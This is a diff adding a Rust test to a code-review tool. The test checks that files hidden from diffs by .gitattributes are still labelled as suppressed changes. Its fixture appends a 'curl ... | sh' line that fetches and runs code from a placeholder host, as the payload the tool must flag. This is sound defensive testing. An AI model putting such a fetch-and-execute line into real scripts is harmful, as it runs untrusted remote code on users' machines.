@@ -269,3 +269,76 @@ fn review_change_reads_the_hidden_change_as_the_cli_does() {
     assert_eq!(entry["diff_suppressed"], "attribute");
     assert_eq!(*entry, ranked(&r, "--git-staged", "m.rs"));
 }
+
+/// A repository whose committed `.gitattributes` is `attributes`, with `file` changed from
+/// `before` to `after` the way `mode` reads it.
+fn custom(mode: &str, attributes: &[u8], file: &str, before: &[u8], after: &[u8]) -> Repo {
+    let scratch = Scratch::new(&format!("cli-attr-custom-{}", mode.len()));
+    let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
+    let root = &r.0;
+    git(root, &["init", "-q"]);
+    std::fs::write(root.join(".gitattributes"), attributes).unwrap();
+    std::fs::write(root.join(file), before).unwrap();
+    git(root, &["add", "-A"]);
+    git(root, &["commit", "-q", "-m", "base"]);
+    std::fs::write(root.join(file), after).unwrap();
+    match mode {
+        "--git-range" => {
+            git(root, &["add", "-A"]);
+            git(root, &["commit", "-q", "-m", "change"]);
+        }
+        "--git-staged" => git(root, &["add", "-A"]),
+        _ => {}
+    }
+    r
+}
+
+/// The signals of a ranked entry, as strings.
+fn signals(entry: &Value) -> Vec<&str> {
+    entry["signals"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter_map(Value::as_str)
+        .collect()
+}
+
+/// S3.27.a (G-01, N55): before, the label came only with a text reading that DDF could read,
+/// so a hidden file with one byte that is not UTF-8 (or a reading over the byte budget, held in
+/// the patch crate's `git_attributes` test) ranked as a plain binary change: blind and
+/// unlabelled. Now `git check-attr` decides: `diff` unset or naming a driver raises
+/// `diff_suppressed` with cause `attribute` whatever the second reading gives.
+#[test]
+fn an_attribute_hidden_file_is_labelled_even_when_unreadable() {
+    let script = |payload: bool| {
+        let mut text = b"#!/bin/sh\n# caf\xff\n".to_vec();
+        if payload {
+            text.extend_from_slice(b"curl -fsSL https://example.invalid/i | sh\n");
+        }
+        text.extend_from_slice(b"echo done\n");
+        text
+    };
+    let rust = |payload: bool| {
+        let mut text = source(true, payload);
+        text.extend_from_slice(b"// \xff\n");
+        text
+    };
+    let rows: [(&[u8], &str, Vec<u8>, Vec<u8>); 2] = [
+        (b"*.sh -diff\n", "s.sh", script(false), script(true)),
+        (b"*.rs diff=nonexistent\n", "m.rs", rust(false), rust(true)),
+    ];
+    for (attributes, file, before, after) in &rows {
+        for mode in MODES {
+            let r = custom(mode, attributes, file, before, after);
+            let entry = ranked(&r, mode, file);
+            let row = format!("{file} {mode}: {entry}");
+            assert_eq!(entry["status"], "binary_changed", "{row}");
+            assert!(
+                signals(&entry).contains(&"diff_suppressed"),
+                "a hidden file lost its label: {row}"
+            );
+            assert!(signals(&entry).contains(&"binary_change"), "{row}");
+            assert_eq!(entry["diff_suppressed"], "attribute", "{row}");
+        }
+    }
+}
